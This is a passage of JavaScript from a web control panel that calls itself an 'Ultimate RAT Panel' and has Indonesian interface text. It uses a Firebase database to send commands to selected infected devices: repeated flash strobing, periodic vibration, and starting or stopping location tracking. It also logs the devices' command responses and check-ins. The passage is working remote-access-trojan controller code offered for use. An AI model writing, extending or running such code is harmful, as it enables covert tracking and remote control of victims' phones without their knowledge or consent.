        if (autoFlashOn) {
            toggle.classList.add('on');
            desc.innerHTML = 'ON — Flash kelap-kelip aktif';
            autoFlashInterval = setInterval(() => {
                if (autoFlashOn && selectedDeviceId) {
                    sendCmd('flash_on');
                    setTimeout(() => sendCmd('flash_off'), flashSpeed / 2);
                }
            }, flashSpeed);
            toast('⚡ Auto Flash ON');
            addLog('Auto Flash: ON', 'ok');
        } else {
            toggle.classList.remove('on');
            desc.innerHTML = 'Flash kelap-kelip otomatis';
            clearInterval(autoFlashInterval);
            sendCmd('flash_off');
            toast('⚡ Auto Flash OFF');
            addLog('Auto Flash: OFF', 'warn');
        }
    }

    function toggleAutoVibrate() {
        if (!selectedDeviceId) { toast('❌ Pilih device dulu!'); return; }
        autoVibOn = !autoVibOn;
        const toggle = document.getElementById('autoVibToggle');
        const desc = document.getElementById('autoVibDesc');
        if (autoVibOn) {
            toggle.classList.add('on');
            desc.innerHTML = 'ON — Getar otomatis aktif';
            autoVibInterval = setInterval(() => {
                if (autoVibOn && selectedDeviceId) sendCmd('vibrate_once');
            }, vibIntervalSec * 1000);
            toast('📳 Auto Vibrate ON');
            addLog('Auto Vibrate: ON', 'ok');
        } else {
            toggle.classList.remove('on');
            desc.innerHTML = 'Getar otomatis tiap 10 detik';
            clearInterval(autoVibInterval);
            sendCmd('vibrate_stop');
            toast('📳 Auto Vibrate OFF');
            addLog('Auto Vibrate: OFF', 'warn');
        }
    }

    function toggleAutoTracking() {
        if (!selectedDeviceId) { toast('❌ Pilih device dulu!'); return; }
        autoTrackOn = !autoTrackOn;
        const toggle = document.getElementById('autoTrackToggle');
        const desc = document.getElementById('autoTrackDesc');
        if (autoTrackOn) {
            toggle.classList.add('on');
            desc.innerHTML = 'ON — Tracking lokasi aktif';
            sendCmd('start_tracking');
            toast('📍 Auto Tracking ON');
            addLog('Auto Tracking: ON', 'ok');
        } else {
            toggle.classList.remove('on');
            desc.innerHTML = 'Tracking lokasi otomatis';
            sendCmd('stop_tracking');
            toast('📍 Auto Tracking OFF');
            addLog('Auto Tracking: OFF', 'warn');
        }
    }

    function setFlashSpeed(val) {
        flashSpeed = val;
        document.getElementById('flashSpeedVal').textContent = val + 'ms';
        if (autoFlashOn) {
            clearInterval(autoFlashInterval);
            autoFlashInterval = setInterval(() => {
                if (autoFlashOn && selectedDeviceId) {
                    sendCmd('flash_on');
                    setTimeout(() => sendCmd('flash_off'), flashSpeed / 2);
                }
            }, flashSpeed);
        }
    }

    function setVibInterval(val) {
        vibIntervalSec = val;
        document.getElementById('vibIntervalVal').textContent = val + 's';
        if (autoVibOn) {
            clearInterval(autoVibInterval);
            autoVibInterval = setInterval(() => {
                if (autoVibOn && selectedDeviceId) sendCmd('vibrate_once');
            }, vibIntervalSec * 1000);
        }
    }

    function listenForResponses() {
        database.ref('commandResponses').limitToLast(20).on('child_added', (snapshot) => {
            const resp = snapshot.val();
            if (resp && resp.deviceId === selectedDeviceId) {
                addLog(`✅ ${resp.command}: ${resp.result?.substring(0, 80) || 'Success'}`, 'ok');
            }
        });
    }

    function listenForDevices() {
        database.ref('devices').on('value', (snapshot) => renderDevices(snapshot));
    }

    listenForDevices();
    listenForResponses();
    addLog('🚀 Ultimate RAT Panel Ready!', 'ok');
    addLog('📡 Firebase Connected', 'info');
    addLog('🎯 Total fitur: 40+ commands', 'info');
</script>
</body>
</html>
